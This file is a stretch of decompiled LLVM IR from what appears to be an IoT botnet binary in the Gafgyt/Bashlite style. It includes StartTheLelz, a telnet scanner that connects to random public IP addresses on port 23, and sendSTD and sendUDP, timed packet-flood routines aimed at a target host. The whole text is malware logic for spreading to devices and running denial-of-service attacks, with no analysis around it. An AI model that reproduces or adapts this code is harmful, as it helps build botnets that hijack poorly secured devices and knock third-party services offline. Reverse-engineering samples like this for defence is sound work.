  %v2_10007cf8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 268467476, i32* @lr, align 4
  %v5_10007d10 = call i32 @__GI_setsockopt(i32 %v3_10007cec, i32 6, i32 1, i32 %v2_10007cf8, i32 4)
  %v4_10007d1c = icmp eq i32 %v3_10007cec, -1
  br i1 %v4_10007d1c, label %dec_label_pc_10007d24, label %dec_label_pc_10007d30

dec_label_pc_10007d24:                            ; preds = %dec_label_pc_10007c90
  br label %dec_label_pc_10007d68

dec_label_pc_10007d30:                            ; preds = %dec_label_pc_10007c90
  store i32 268467524, i32* @lr, align 4
  %v3_10007d40 = call i32 @__libc_connect(i32 %v3_10007cec, i32 %v2_10007ca8, i32 16)
  %v4_10007d4c = icmp eq i32 %v3_10007d40, -1
  br i1 %v4_10007d4c, label %dec_label_pc_10007d54, label %dec_label_pc_10007d60

dec_label_pc_10007d54:                            ; preds = %dec_label_pc_10007d30
  br label %dec_label_pc_10007d68

dec_label_pc_10007d60:                            ; preds = %dec_label_pc_10007d30
  br label %dec_label_pc_10007d68

dec_label_pc_10007d68:                            ; preds = %dec_label_pc_10007d54, %dec_label_pc_10007d24, %dec_label_pc_10007c84, %dec_label_pc_10007d60
  %stack_var_-16.0 = phi i32 [ 0, %dec_label_pc_10007c84 ], [ 0, %dec_label_pc_10007d24 ], [ 0, %dec_label_pc_10007d54 ], [ %v3_10007cec, %dec_label_pc_10007d60 ]
  ret i32 %stack_var_-16.0

; uselistorder directives
  uselistorder i32 %v2_10007ca8, { 1, 0 }
  uselistorder i32 %v3_10007ca0, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_10007d68, { 3, 0, 1, 2 }
}

define i32 @StartTheLelz(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-640 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10007d88 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10007d88, i32* %stack_var_-640, align 4
  store i32 268467644, i32* @lr, align 4
  %v1_10007db8 = call i32 @__GI_time(i32 0)
  %v0_10007dc4 = call i32 @rand_cmwc()
  %v2_10007dcc = xor i32 %v1_10007db8, %v0_10007dc4
  store i32 ptrtoint (i32* @global_var_10007dd8.256 to i32), i32* @lr, align 4
  %v1_10007dd4 = call i32 @srand(i32 %v2_10007dcc)
  store i32 2, i32* %stack_var_-60, align 4
  store i32 23, i32* @r3, align 4
  %v1_10007de4 = call i32 @htons(i32 23)
  %v2_10007df4 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_10007df4, i32* %r9.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 513, i32* @r3, align 4
  store i32 268467728, i32* @lr, align 4
  %v0_10007e0c = call i32 @malloc()
  store i32 513, i32* %r9.global-to-local, align 4
  store i32 268467760, i32* @lr, align 4
  %v3_10007e2c = call i32 @__GI_memset(i32 %v0_10007e0c, i32 0, i32 513)
  %v1_10007e34 = mul i32 %arg2, 28
  %v1_10007e3c = add i32 %v1_10007e34, 30
  %v1_10007e40 = and i32 %v1_10007e3c, -16
  %v2_10007e48 = load i32, i32* %stack_var_-640, align 4
  %v1_10007e50 = load i32, i32* @r1, align 4
  %v3_10007e50 = sub i32 %v1_10007e50, %v1_10007e40
  %v4_10007e50 = inttoptr i32 %v3_10007e50 to i32*
  store i32 %v2_10007e48, i32* %v4_10007e50, align 4
  %v1_10007e60 = add i32 %v3_10007e50, 23
  %v1_10007e64 = and i32 %v1_10007e60, -16
  store i32 %v1_10007e64, i32* %r9.global-to-local, align 4
  %v1_10007e80 = mul i32 %arg2, 5
  store i32 ptrtoint (i32* @global_var_10007e94.257 to i32), i32* @lr, align 4
  %v3_10007e90 = call i32 @__GI_memset(i32 %v1_10007e64, i32 0, i32 %v1_10007e80)
  store i32 %arg2, i32* %r9.global-to-local, align 4
  %v2_10007f3010 = icmp sgt i32 %arg2, 0
  br i1 %v2_10007f3010, label %dec_label_pc_10007ea0, label %dec_label_pc_10007f38

dec_label_pc_10007ea0:                            ; preds = %entry, %dec_label_pc_10007ea0
  %storemerge313 = phi i32 [ %v1_10007f20, %dec_label_pc_10007ea0 ], [ 0, %entry ]
  %v1_10007ea8 = mul i32 %storemerge313, 28
  %v2_10007eac = add i32 %v1_10007ea8, %v1_10007e64
  store i32 %v2_10007eac, i32* %r9.global-to-local, align 4
  %v2_10007eb4 = inttoptr i32 %v2_10007eac to i32*
  store i32 0, i32* %v2_10007eb4, align 4
  %v1_10007ebc = load i32, i32* %r9.global-to-local, align 4
  %v2_10007ebc = add i32 %v1_10007ebc, 4
  %v3_10007ebc = inttoptr i32 %v2_10007ebc to i32*
  store i32 0, i32* %v3_10007ebc, align 4
  %v1_10007ec4 = load i32, i32* %r9.global-to-local, align 4
  %v2_10007ec4 = add i32 %v1_10007ec4, 8
  %v3_10007ec4 = inttoptr i32 %v2_10007ec4 to i32*
  store i32 0, i32* %v3_10007ec4, align 4
  %v1_10007ecc = load i32, i32* %r9.global-to-local, align 4
  %v2_10007ecc = add i32 %v1_10007ecc, 12
  %v3_10007ecc = inttoptr i32 %v2_10007ecc to i32*
  store i32 0, i32* %v3_10007ecc, align 4
  %v1_10007ed4 = load i32, i32* %r9.global-to-local, align 4
  %v2_10007ed4 = add i32 %v1_10007ed4, 16
  %v3_10007ed4 = inttoptr i32 %v2_10007ed4 to i32*
  store i32 0, i32* %v3_10007ed4, align 4
  %v1_10007edc = load i32, i32* %r9.global-to-local, align 4
  %v2_10007edc = add i32 %v1_10007edc, 20
  %v3_10007edc = inttoptr i32 %v2_10007edc to i32*
  store i32 0, i32* %v3_10007edc, align 4
  %v1_10007ee4 = load i32, i32* %r9.global-to-local, align 4
  %v2_10007ee4 = add i32 %v1_10007ee4, 24
  %v3_10007ee4 = inttoptr i32 %v2_10007ee4 to i32*
  store i32 0, i32* %v3_10007ee4, align 4
  %v3_10007efc = add i32 %v2_10007eac, 9
  %v4_10007efc = inttoptr i32 %v3_10007efc to i8*
  store i8 1, i8* %v4_10007efc, align 1
  %v1_10007f10 = add i32 %v2_10007eac, 24
  %v2_10007f18 = inttoptr i32 %v1_10007f10 to i32*
  store i32 %v0_10007e0c, i32* %v2_10007f18, align 4
  %v1_10007f20 = add nuw nsw i32 %storemerge313, 1
  store i32 %arg2, i32* %r9.global-to-local, align 4
  %v2_10007f30 = icmp slt i32 %v1_10007f20, %arg2
  br i1 %v2_10007f30, label %dec_label_pc_10007ea0, label %dec_label_pc_10007f38

dec_label_pc_10007f38:                            ; preds = %dec_label_pc_10007ea0, %entry
  br label %dec_label_pc_10007f40

dec_label_pc_10007f40:                            ; preds = %dec_label_pc_10007f40, %dec_label_pc_10007f38
  %stack_var_-604.0 = phi i32 [ 0, %dec_label_pc_10007f38 ], [ %v1_10007f44, %dec_label_pc_10007f40 ]
  %v1_10007f44 = add i32 %stack_var_-604.0, 1
  %v1_10007f58 = mul i32 %v1_10007f44, 4
  %v2_10007f5c = add i32 %v1_10007f58, ptrtoint ([10 x i8*]* @global_var_100283bc.268 to i32)
  store i32 %v2_10007f5c, i32* %r9.global-to-local, align 4
  %v1_10007f60 = inttoptr i32 %v2_10007f5c to i32*
  %v2_10007f60 = load i32, i32* %v1_10007f60, align 4
  %v3_10007f64 = icmp eq i32 %v2_10007f60, 0
  br i1 %v3_10007f64, label %dec_label_pc_10007f6c.preheader, label %dec_label_pc_10007f40

dec_label_pc_10007f6c.preheader:                  ; preds = %dec_label_pc_10007f40
  %v2_10007fb4 = add i32 %v1_10007e64, 16
  %v2_100080c8 = or i32 %v1_10007e64, 4
  %v2_100082d0 = ptrtoint i32* %stack_var_-60 to i32
  br label %dec_label_pc_10007f6c

dec_label_pc_10007f6c:                            ; preds = %dec_label_pc_10007f6c, %dec_label_pc_10008d9c, %dec_label_pc_10007f6c.preheader
  store i32 %arg2, i32* %r9.global-to-local, align 4
  br i1 %v2_10007f3010, label %dec_label_pc_10007f78, label %dec_label_pc_10007f6c

dec_label_pc_10007f78:                            ; preds = %dec_label_pc_10007f6c, %dec_label_pc_10008d9c
  %storemerge48 = phi i32 [ %v1_10008da0, %dec_label_pc_10008d9c ], [ 0, %dec_label_pc_10007f6c ]
  %v1_10007f80 = mul i32 %storemerge48, 28
  %v2_10007f84 = add i32 %v1_10007f80, %v1_10007e64
  %v1_10007f88 = add i32 %v2_10007f84, 16
  store i32 %v1_10007f88, i32* %r9.global-to-local, align 4
  %v1_10007f8c = inttoptr i32 %v1_10007f88 to i32*
  %v2_10007f8c = load i32, i32* %v1_10007f8c, align 4
  %v3_10007f90 = icmp eq i32 %v2_10007f8c, 0
  br i1 %v3_10007f90, label %dec_label_pc_10007f98, label %dec_label_pc_10007fc0

dec_label_pc_10007f98:                            ; preds = %dec_label_pc_10007f78
  store i32 268468132, i32* @lr, align 4
  %v1_10007fa0 = call i32 @__GI_time(i32 0)
  %v1_10007fb0 = mul i32 %storemerge48, 28
  %v1_10007fb8 = add i32 %v2_10007fb4, %v1_10007fb0
  store i32 %v1_10007fb8, i32* %r9.global-to-local, align 4
  %v2_10007fbc = inttoptr i32 %v1_10007fb8 to i32*
  store i32 %v1_10007fa0, i32* %v2_10007fbc, align 4
  br label %dec_label_pc_10007fc0

dec_label_pc_10007fc0:                            ; preds = %dec_label_pc_10007f78, %dec_label_pc_10007f98
  store i32 %v2_10007f84, i32* %r9.global-to-local, align 4
  %v1_10007fd0 = add i32 %v2_10007f84, 8
  %v2_10007fd0 = inttoptr i32 %v1_10007fd0 to i8*
  %v3_10007fd0 = load i8, i8* %v2_10007fd0, align 4
  %v2_10007fe0 = icmp ugt i8 %v3_10007fd0, 7
  br i1 %v2_10007fe0, label %dec_label_pc_10008d9c, label %dec_label_pc_10007fe8

dec_label_pc_10007fe8:                            ; preds = %dec_label_pc_10007fc0
  %v4_10007fd0 = zext i8 %v3_10007fd0 to i32
  %v1_10007fec = mul nuw nsw i32 %v4_10007fd0, 4
  %v2_10007ff8 = add i32 %v1_10007fec, ptrtoint (i32* @global_var_1001628c.269 to i32)
  store i32 %v2_10007ff8, i32* %r9.global-to-local, align 4
  %v1_10007ffc = inttoptr i32 %v2_10007ff8 to i32*
  %v2_10007ffc = load i32, i32* %v1_10007ffc, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v2_10008008 = add i32 %v2_10007ffc, ptrtoint (i32* @global_var_1001628c.269 to i32)
  call void @__pseudo_branch(i32 %v2_10008008)
  store i32 %v2_10007f84, i32* %r9.global-to-local, align 4
  %v1_10008024 = add i32 %v2_10007f84, 9
  %v2_10008024 = inttoptr i32 %v1_10008024 to i8*
  %v3_10008024 = load i8, i8* %v2_10008024, align 1
  %v3_1000802c = icmp eq i8 %v3_10008024, 1
  store i32 %v1_10007e64, i32* %r9.global-to-local, align 4
  br i1 %v3_1000802c, label %dec_label_pc_10008034, label %dec_label_pc_100080d8

dec_label_pc_10008034:                            ; preds = %dec_label_pc_10007fe8
  %v1_10008044 = add i32 %v2_10007f84, 24
  store i32 %v1_10008044, i32* %r9.global-to-local, align 4
  %v1_10008048 = inttoptr i32 %v1_10008044 to i32*
  %v2_10008048 = load i32, i32* %v1_10008048, align 4
  store i32 %v2_10007f84, i32* %r9.global-to-local, align 4
  %v2_10008064 = inttoptr i32 %v2_10007f84 to i32*
  store i32 0, i32* %v2_10008064, align 4
  %v1_1000806c = load i32, i32* %r9.global-to-local, align 4
  %v2_1000806c = add i32 %v1_1000806c, 4
  %v3_1000806c = inttoptr i32 %v2_1000806c to i32*
  store i32 0, i32* %v3_1000806c, align 4
  %v1_10008074 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008074 = add i32 %v1_10008074, 8
  %v3_10008074 = inttoptr i32 %v2_10008074 to i32*
  store i32 0, i32* %v3_10008074, align 4
  %v1_1000807c = load i32, i32* %r9.global-to-local, align 4
  %v2_1000807c = add i32 %v1_1000807c, 12
  %v3_1000807c = inttoptr i32 %v2_1000807c to i32*
  store i32 0, i32* %v3_1000807c, align 4
  %v1_10008084 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008084 = add i32 %v1_10008084, 16
  %v3_10008084 = inttoptr i32 %v2_10008084 to i32*
  store i32 0, i32* %v3_10008084, align 4
  %v1_1000808c = load i32, i32* %r9.global-to-local, align 4
  %v2_1000808c = add i32 %v1_1000808c, 20
  %v3_1000808c = inttoptr i32 %v2_1000808c to i32*
  store i32 0, i32* %v3_1000808c, align 4
  %v1_10008094 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008094 = add i32 %v1_10008094, 24
  %v3_10008094 = inttoptr i32 %v2_10008094 to i32*
  store i32 0, i32* %v3_10008094, align 4
  store i32 %v1_10008044, i32* %r9.global-to-local, align 4
  store i32 %v2_10008048, i32* %v1_10008048, align 4
  %v1_100080b8 = call i32 @GetRandomPublicIP(i32 %v1_10008044)
  %v0_100080c4 = load i32, i32* @r29, align 4
  %v1_100080c4 = mul i32 %v0_100080c4, 28
  %v1_100080cc = add i32 %v1_100080c4, %v2_100080c8
  store i32 %v1_100080cc, i32* %r9.global-to-local, align 4
  %v2_100080d0 = inttoptr i32 %v1_100080cc to i32*
  store i32 %v1_100080b8, i32* %v2_100080d0, align 4
  br label %dec_label_pc_100081d0

dec_label_pc_100080d8:                            ; preds = %dec_label_pc_10007fe8
  store i32 %v2_10007f84, i32* %r9.global-to-local, align 4
  %v3_100080e8 = load i8, i8* %v2_10008024, align 1
  %v3_100080f0 = icmp eq i8 %v3_100080e8, 0
  br i1 %v3_100080f0, label %dec_label_pc_100080f8, label %dec_label_pc_100081d0

dec_label_pc_100080f8:                            ; preds = %dec_label_pc_100080d8
  store i32 %v2_10007f84, i32* %r9.global-to-local, align 4
  %v1_10008108 = add i32 %v2_10007f84, 11
  %v2_10008108 = inttoptr i32 %v1_10008108 to i8*
  %v3_10008108 = load i8, i8* %v2_10008108, align 1
  %v1_10008110 = add i8 %v3_10008108, 1
  store i8 %v1_10008110, i8* %v2_10008108, align 1
  store i32 %v2_10007f84, i32* %r9.global-to-local, align 4
  %v1_10008138 = add i32 %v2_10007f84, 10
  %v2_10008138 = inttoptr i32 %v1_10008138 to i8*
  %v3_10008138 = load i8, i8* %v2_10008138, align 2
  %v1_10008140 = add i8 %v3_10008138, 1
  store i8 %v1_10008140, i8* %v2_10008138, align 2
  store i32 %v2_10007f84, i32* %r9.global-to-local, align 4
  %v3_10008168 = load i8, i8* %v2_10008108, align 1
  %v3_10008170 = icmp eq i8 %v3_10008168, 3
  store i32 %v2_10007f84, i32* %r9.global-to-local, align 4
  br i1 %v3_10008170, label %dec_label_pc_10008178, label %dec_label_pc_10008194

dec_label_pc_10008178:                            ; preds = %dec_label_pc_100080f8
  store i8 1, i8* %v2_10008024, align 1
  br label %dec_label_pc_10008d9c

dec_label_pc_10008194:                            ; preds = %dec_label_pc_100080f8
  %v3_100081a4 = load i8, i8* %v2_10008138, align 2
  %v3_100081ac = icmp eq i8 %v3_100081a4, 3
  br i1 %v3_100081ac, label %dec_label_pc_100081b4, label %dec_label_pc_100081d0

dec_label_pc_100081b4:                            ; preds = %dec_label_pc_10008194
  store i32 %v2_10007f84, i32* %r9.global-to-local, align 4
  store i8 1, i8* %v2_10008024, align 1
  br label %dec_label_pc_10008d9c

dec_label_pc_100081d0:                            ; preds = %dec_label_pc_10008194, %dec_label_pc_100080d8, %dec_label_pc_10008034
  store i32 2, i32* %stack_var_-60, align 4
  store i32 23, i32* @r3, align 4
  %v1_100081dc = call i32 @htons(i32 23)
  store i32 0, i32* %stack_var_-52, align 4
  %v1_10008210 = add i32 %v2_10007f84, 4
  store i32 %v1_10008210, i32* %r9.global-to-local, align 4
  store i32 268468784, i32* @lr, align 4
  %v3_1000822c = call i32 @socket(i32 2, i32 1, i32 0)
  %v1_10008238 = mul i32 %storemerge48, 28
  %v2_1000823c = add i32 %v1_10008238, %v1_10007e64
  %v2_10008240 = inttoptr i32 %v2_1000823c to i32*
  store i32 %v3_1000822c, i32* %v2_10008240, align 4
  store i32 %v2_10007f84, i32* %r9.global-to-local, align 4
  %v1_10008254 = inttoptr i32 %v2_10007f84 to i32*
  %v2_10008254 = load i32, i32* %v1_10008254, align 4
  store i32 %v2_10008254, i32* %r9.global-to-local, align 4
  %v4_1000825c = icmp eq i32 %v2_10008254, -1
  br i1 %v4_1000825c, label %dec_label_pc_10008d9c, label %dec_label_pc_10008264

dec_label_pc_10008264:                            ; preds = %dec_label_pc_100081d0
  store i32 %v2_10007f84, i32* %r9.global-to-local, align 4
  %v2_10008274 = load i32, i32* %v1_10008254, align 4
  store i32 %v2_10007f84, i32* %r9.global-to-local, align 4
  %v2_10008288 = load i32, i32* %v1_10008254, align 4
  store i32 268468896, i32* @lr, align 4
  %v2_1000829c = call i32 @__libc_fcntl(i32 %v2_10008288, i32 3)
  store i32 268468924, i32* @lr, align 4
  %v2_100082b8 = call i32 @__libc_fcntl(i32 %v2_10008274, i32 4)
  store i32 %v2_10007f84, i32* %r9.global-to-local, align 4
  %v2_100082cc = load i32, i32* %v1_10008254, align 4
  store i32 %v2_100082d0, i32* %r9.global-to-local, align 4
  store i32 268468964, i32* @lr, align 4
  %v3_100082e0 = call i32 @__libc_connect(i32 %v2_100082cc, i32 %v2_100082d0, i32 16)
  store i32 %v3_100082e0, i32* %r9.global-to-local, align 4
  %v4_100082ec = icmp eq i32 %v3_100082e0, -1
  br i1 %v4_100082ec, label %dec_label_pc_100082f4, label %dec_label_pc_10008324

dec_label_pc_100082f4:                            ; preds = %dec_label_pc_10008264
  %v0_100082f4 = call i32 @__errno_location()
  store i32 %v0_100082f4, i32* %r9.global-to-local, align 4
  %v1_100082fc = inttoptr i32 %v0_100082f4 to i32*
  %v2_100082fc = load i32, i32* %v1_100082fc, align 4
  %v3_10008300 = icmp eq i32 %v2_100082fc, 115
  br i1 %v3_10008300, label %dec_label_pc_10008324, label %dec_label_pc_10008308

dec_label_pc_10008308:                            ; preds = %dec_label_pc_100082f4
  store i32 %v1_10007e64, i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10008320.270 to i32), i32* @lr, align 4
  %v2_1000831c = call i32 @reset_telstate(i32 %v2_10007f84, i32 %v1_10007e64)
  br label %dec_label_pc_10008d9c

dec_label_pc_10008324:                            ; preds = %dec_label_pc_10008264, %dec_label_pc_100082f4
  store i32 %v1_10007e64, i32* %r9.global-to-local, align 4
  %v3_1000833c = call i32 @advance_state(i32* nonnull %v1_10008254, i32 1)
  br label %dec_label_pc_10008d9c

dec_label_pc_10008d9c:                            ; preds = %dec_label_pc_100081d0, %dec_label_pc_10007fc0, %dec_label_pc_10008324, %dec_label_pc_10008308, %dec_label_pc_100081b4, %dec_label_pc_10008178
  %v1_10008da0 = add nuw nsw i32 %storemerge48, 1
  store i32 %arg2, i32* %r9.global-to-local, align 4
  %v2_10008db0 = icmp slt i32 %v1_10008da0, %arg2
  br i1 %v2_10008db0, label %dec_label_pc_10007f78, label %dec_label_pc_10007f6c

; uselistorder directives
  uselistorder i32 %v1_10008da0, { 1, 0 }
  uselistorder i8* %v2_10008138, { 1, 0, 2 }
  uselistorder i8* %v2_10008108, { 1, 0, 2 }
  uselistorder i32 %v1_10008044, { 1, 0, 2, 3 }
  uselistorder i8 %v3_10007fd0, { 1, 0 }
  uselistorder i32 %v2_10007f84, { 7, 8, 9, 10, 12, 11, 13, 0, 1, 2, 4, 3, 6, 5, 17, 15, 14, 16, 19, 18, 21, 20, 22 }
  uselistorder i32 %storemerge48, { 3, 1, 0, 2 }
  uselistorder i32 %v1_10007f20, { 1, 0 }
  uselistorder i32 %storemerge313, { 1, 0 }
  uselistorder i32 %v1_10007e64, { 6, 5, 4, 0, 7, 1, 3, 8, 2, 9, 10 }
  uselistorder i32* %stack_var_-60, { 0, 2, 1 }
  uselistorder i32* %r9.global-to-local, { 33, 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 48, 28, 29, 30, 31, 32, 46, 34, 42, 35, 36, 37, 38, 39, 40, 41, 47, 43, 44, 45 }
  uselistorder i32 %arg2, { 4, 3, 2, 6, 5, 0, 1, 7, 8 }
  uselistorder label %dec_label_pc_10008d9c, { 2, 3, 0, 4, 5, 1 }
  uselistorder label %dec_label_pc_10008324, { 1, 0 }
  uselistorder label %dec_label_pc_10007fc0, { 1, 0 }
  uselistorder label %dec_label_pc_10007f78, { 1, 0 }
  uselistorder label %dec_label_pc_10007f6c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10007ea0, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  store i32 268471788, i32* @lr, align 4
  %v3_10008de8 = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 268471804, i32* @lr, align 4
  %v1_10008df8 = call i32 @__GI_time(i32 0)
  store i32 268471824, i32* @lr, align 4
  %v1_10008e0c = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_10008e18 = ptrtoint i32* %stack_var_-196 to i32
  store i32 0, i32* %stack_var_-196, align 4
  store i32 0, i32* %stack_var_-192, align 4
  %v1_10008e40 = add i32 %v1_10008e0c, 16
  %v2_10008e40 = inttoptr i32 %v1_10008e40 to i32*
  %v3_10008e40 = load i32, i32* %v2_10008e40, align 4
  %v1_10008e44 = inttoptr i32 %v3_10008e40 to i32*
  %v2_10008e44 = load i32, i32* %v1_10008e44, align 4
  %v2_10008e4c = ptrtoint i32* %stack_var_-192 to i32
  %v1_10008e54 = add i32 %v1_10008e0c, 12
  %v2_10008e54 = inttoptr i32 %v1_10008e54 to i32*
  %v3_10008e54 = load i32, i32* %v2_10008e54, align 4
  store i32 %v3_10008e54, i32* @r5, align 4
  store i32 268471912, i32* @lr, align 4
  %v4_10008e64 = call i32 @bcopy(i32 %v2_10008e44, i32 %v2_10008e4c, i32 %v3_10008e54, i32 %v1_10008e0c)
  %v1_10008e6c = add i32 %v1_10008e0c, 8
  %v2_10008e6c = inttoptr i32 %v1_10008e6c to i32*
  %v3_10008e6c = load i32, i32* %v2_10008e6c, align 4
  %v1_10008e70 = urem i32 %v3_10008e6c, 65536
  store i32 %v1_10008e70, i32* %stack_var_-196, align 4
  %v2_10008e94 = ptrtoint i32* %stack_var_-180 to i32
  %v2_10008ee4 = ptrtoint i32* %stack_var_-216 to i32
  %v2_10008ee8 = add i32 %v2_10008ee4, 36
  %v2_10008f40 = add i32 %v1_10008df8, %arg3
  br label %dec_label_pc_10008e8c

dec_label_pc_10008e8c:                            ; preds = %dec_label_pc_10008f64, %entry
  %storemerge3 = phi i32 [ 0, %entry ], [ %v1_10008f68, %dec_label_pc_10008f64 ]
  store i32 %v2_10008e94, i32* @r3, align 4
  store i32 ptrtoint ([36 x i8*]* @global_var_10016450.351 to i32), i32* @r4, align 4
  store i32 144, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10008eac.352 to i32), i32* @lr, align 4
  %v0_10008ea8 = call i32 @memcpy()
  store i32 268471984, i32* @lr, align 4
  %v0_10008eac = call i32 @random()
  %v1_10008ec4 = urem i32 %v0_10008eac, 36
  %v1_10008ee0 = mul nuw nsw i32 %v1_10008ec4, 4
  %v1_10008eec = add i32 %v2_10008ee8, %v1_10008ee0
  %v1_10008ef0 = inttoptr i32 %v1_10008eec to i32*
  %v2_10008ef0 = load i32, i32* %v1_10008ef0, align 4
  store i32 %v2_10008ef0, i32* %stack_var_-216, align 4
  %tmp23 = icmp ult i32 %storemerge3, 50
  br i1 %tmp23, label %dec_label_pc_10008f64, label %dec_label_pc_10008f04

dec_label_pc_10008f04:                            ; preds = %dec_label_pc_10008e8c
  store i32 268472088, i32* @lr, align 4
  %v4_10008f14 = call i32 @__libc_send(i32 %v3_10008de8, i32 %v2_10008ef0, i32 65, i32 0)
  store i32 ptrtoint ([3 x i8]* @global_var_10008f2c.353 to i32), i32* @lr, align 4
  %v3_10008f28 = call i32 @__libc_connect(i32 %v3_10008de8, i32 %v2_10008e18, i32 16)
  store i32 268472116, i32* @lr, align 4
  %v1_10008f30 = call i32 @__GI_time(i32 0)
  %v2_10008f44 = icmp slt i32 %v1_10008f30, %v2_10008f40
  br i1 %v2_10008f44, label %dec_label_pc_10008f5c, label %dec_label_pc_10008f4c

dec_label_pc_10008f4c:                            ; preds = %dec_label_pc_10008f04
  store i32 ptrtoint ([3 x i8]* @global_var_10008f54.354 to i32), i32* @lr, align 4
  %v1_10008f50 = call i32 @__libc_close(i32 %v3_10008de8)
  %v1_10008f58 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10008f5c

dec_label_pc_10008f5c:                            ; preds = %dec_label_pc_10008f04, %dec_label_pc_10008f4c
  br label %dec_label_pc_10008f64

dec_label_pc_10008f64:                            ; preds = %dec_label_pc_10008e8c, %dec_label_pc_10008f5c
  %stack_var_-212.0 = phi i32 [ %storemerge3, %dec_label_pc_10008e8c ], [ 0, %dec_label_pc_10008f5c ]
  %v1_10008f68 = add i32 %stack_var_-212.0, 1
  br label %dec_label_pc_10008e8c

; uselistorder directives
  uselistorder i32 %v3_10008e54, { 1, 0 }
  uselistorder i32 %v1_10008e0c, { 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-192, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 1, 0 }
  uselistorder label %dec_label_pc_10008f64, { 1, 0 }
  uselistorder label %dec_label_pc_10008f5c, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10008f74 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10008f74, i32* %stack_var_-160, align 4
  %v0_10008fa8 = load i32, i32* @r10, align 4
  store i32 2, i32* %stack_var_-112, align 4
  %v3_10008fb8 = icmp eq i32 %arg2, 0
  br i1 %v3_10008fb8, label %dec_label_pc_10008fc0, label %dec_label_pc_10008fd4

dec_label_pc_10008fc0:                            ; preds = %entry
  %v0_10008fc0 = call i32 @rand_cmwc()
  br label %dec_label_pc_10008fec

dec_label_pc_10008fd4:                            ; preds = %entry
  %v1_10008fd8 = urem i32 %arg2, 65536
  store i32 %v1_10008fd8, i32* @r3, align 4
  %v1_10008fe0 = call i32 @htons(i32 %v1_10008fd8)
  br label %dec_label_pc_10008fec

dec_label_pc_10008fec:                            ; preds = %dec_label_pc_10008fc0, %dec_label_pc_10008fd4
  %v2_10008fec = ptrtoint i32* %stack_var_-112 to i32
  %v4_10008ffc = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-108, i32 %v2_10008fec)
  %v3_10009004 = icmp eq i32 %v4_10008ffc, 0
  br i1 %v3_10009004, label %dec_label_pc_1000900c, label %dec_label_pc_100095d8

dec_label_pc_1000900c:                            ; preds = %dec_label_pc_10008fec
  %v3_10009030 = icmp eq i32 %arg4, 32
  br i1 %v3_10009030, label %dec_label_pc_10009038, label %dec_label_pc_100091b4

dec_label_pc_10009038:                            ; preds = %dec_label_pc_1000900c
  store i32 268472392, i32* @lr, align 4
  %v3_10009044 = call i32 @socket(i32 2, i32 2, i32 17)
  %v3_10009054 = icmp eq i32 %v3_10009044, 0
  br i1 %v3_10009054, label %dec_label_pc_1000905c, label %dec_label_pc_1000907c

dec_label_pc_1000905c:                            ; preds = %dec_label_pc_10009038
  %v3_10009060 = load i32, i32* @global_var_100287d0.29, align 4
  store i32 ptrtoint (i32* @global_var_10009078.357 to i32), i32* @lr, align 4
  %v4_10009074 = call i32 @sockprintf(i32 %v3_10009060, i32 ptrtoint ([27 x i8]* @global_var_100164e0.356 to i32), i32 268500992)
  br label %dec_label_pc_100095d8

dec_label_pc_1000907c:                            ; preds = %dec_label_pc_10009038
  %v1_10009080 = add i32 %arg5, 1
  store i32 %v1_10009080, i32* @r3, align 4
  store i32 268472460, i32* @lr, align 4
  %v0_10009088 = call i32 @malloc()
  %v3_10009098 = icmp eq i32 %v0_10009088, 0
  br i1 %v3_10009098, label %dec_label_pc_100095d8, label %dec_label_pc_100090a0

dec_label_pc_100090a0:                            ; preds = %dec_label_pc_1000907c
  store i32 268472512, i32* @lr, align 4
  %v3_100090bc = call i32 @__GI_memset(i32 %v0_10009088, i32 0, i32 %v1_10009080)
  %v2_100090c8 = call i32 @makeRandomStr(i32 %v0_10009088, i32 %arg5)
  store i32 268472532, i32* @lr, align 4
  %v1_100090d0 = call i32 @__GI_time(i32 0)
  %v2_100090dc = add i32 %v1_100090d0, %arg3
  %v1_1000918c = mul i32 %v0_10008fa8, 1000
  br label %dec_label_pc_100090f8.outer

dec_label_pc_100090f8.outer:                      ; preds = %dec_label_pc_100090f8.outer.backedge, %dec_label_pc_100090a0
  %stack_var_-48.0.ph = phi i32 [ 0, %dec_label_pc_100090a0 ], [ %storemerge27, %dec_label_pc_100090f8.outer.backedge ]
  %stack_var_-44.0.ph = phi i32 [ 0, %dec_label_pc_100090a0 ], [ %v1_10009170, %dec_label_pc_100090f8.outer.backedge ]
  br label %dec_label_pc_100090f8

